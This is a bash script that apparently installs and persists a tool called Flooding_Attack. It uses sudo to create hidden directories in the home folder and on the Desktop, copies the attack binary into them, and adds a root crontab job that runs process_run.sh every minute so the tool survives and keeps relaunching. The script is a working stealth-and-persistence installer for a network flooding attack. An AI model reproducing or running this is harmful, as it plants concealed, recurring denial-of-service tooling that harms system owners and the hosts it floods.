echo "=== start #"

sudo mkdir ~/.etc
sudo mkdir ~/.etc/.module
sudo mkdir ~/Desktop/.hidden_attack
echo "=== mkdir #"

# get the absolute directory location where this script is located
get_script_dir () {
     SOURCE="${BASH_SOURCE[0]}"
     # While $SOURCE is a symlink, resolve it
     while [ -h "$SOURCE" ]; do
          DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
          SOURCE="$( readlink "$SOURCE" )"
          # If $SOURCE was a relative symlink (so no "/" as prefix, need to resolve it relative to the symlink base directory
          [[ $SOURCE != /* ]] && SOURCE="$DIR/$SOURCE"
     done
     DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
     echo "$DIR"
}
path=$(get_script_dir)
add="/Flooding_Attack"
newpath=${path}${add}
echo "=== NEWPATH : $newpath"

sudo cp $newpath ~/.etc/.module
echo "=== cp 1 #"

sudo cp $newpath  ~/Desktop/.hidden_attack/Flooding_Attack
echo "=== cp 2 #"


# add the process into crontab
LIST=`sudo crontab -l`
process_ele=${path}"/process_run.sh"
if echo "$LIST" | grep -q "$process_ele"; then
	echo "The back job had been added.";
else
	echo "$process_ele ===== is put into crontab"
   	sudo crontab -l | { cat; echo "*/1 * * * * $process_ele"; } | sudo crontab -
fi





